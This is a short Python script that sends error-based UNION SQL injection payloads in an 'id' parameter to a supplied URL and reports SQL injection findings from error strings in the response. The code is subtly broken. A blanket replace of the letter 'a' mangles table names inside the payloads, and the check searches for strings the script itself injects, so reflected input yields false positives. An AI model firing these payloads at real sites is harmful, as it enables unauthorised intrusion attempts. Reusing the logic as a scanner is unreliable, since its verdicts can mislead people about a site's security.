import requests
from bs4 import BeautifulSoup

def test_sql_injection(url):
    # Define a list of common database query keywords to use in the injection
    query_keywords = ['SELECT', 'FROM', 'WHERE', 'JOIN', 'LIMIT']

    # Define a list of error types to test for in the injection response
    error_types = ['syntax error', 'division by zero', 'unknown column', 'table does not exist', 'out of range', 'string or binary data would be truncated', 'not enough space']

    # Define a list of payloads to use for the error-based injection
    payloads = [
        "' UNION ALL SELECT 1,2,'a' FROM nonexistent_table WHERE 1=0 AND '1'='1",
        "' UNION ALL SELECT 1,2,CAST('a' AS INTEGER) FROM nonexistent_table WHERE 1=0 AND '1'='1",
        "' UNION ALL SELECT 1,2,CAST('a' AS NVARCHAR) FROM nonexistent_table WHERE 1=0 AND '1'='1",
        "' UNION ALL SELECT 1,2,CAST('a' AS DATETIME) FROM nonexistent_table WHERE 1=0 AND '1'='1"
    ]

    # Add a single quote to the end of the URL to test for SQL injection
    url_injection = url + "'"

    # Loop over the payloads, query keywords, and error types to create an error-based payload
    for payload in payloads:
        for keyword in query_keywords:
            for error_type in error_types:
                # Replace the 'a' in the payload with the error type to test for
                payload_error = payload.replace('a', error_type)

                # Add the query keyword to the payload
                payload_full = f"{payload_error} UNION ALL SELECT {keyword},1/0 FROM nonexistent_table WHERE 0=1 --"

                # Make an HTTP GET request with the injection and payload
                r = requests.get(url_injection, params={'id': payload_full})
                soup = BeautifulSoup(r.text, 'html.parser')

                # Check the response to determine if the injection was successful
                if error_type.lower() in soup.text.lower():
                    print(f"SQL injection vulnerability detected with error type: {error_type}, query keyword: {keyword}")
                else:
                    print(f"No SQL injection vulnerabilities detected with error type: {error_type}, query keyword: {keyword}")
